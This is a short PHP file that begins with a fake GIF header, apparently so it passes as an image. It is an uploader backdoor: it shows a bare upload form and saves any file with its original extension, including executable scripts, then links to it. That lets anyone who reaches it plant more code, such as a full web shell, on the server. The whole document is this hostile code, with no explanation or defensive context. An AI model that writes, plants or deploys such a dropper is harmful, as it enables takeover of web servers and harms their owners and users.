GIF89;a
<?php
$y = true;
if($y){?><form method=post enctype=multipart/form-data><input type=file name=i><input type=submit value=1></form><?php }
if(isset($_FILES['i'])){$a=$_FILES['i'];$b=strtolower(substr(strrchr($a['name'],'.'),1));$c=rand(1000,9999).time().'.'.$b;if(@copy($a['tmp_name'],$c)){echo'<a href="'.$c.'">'.$c.'</a>';}exit;}
?>
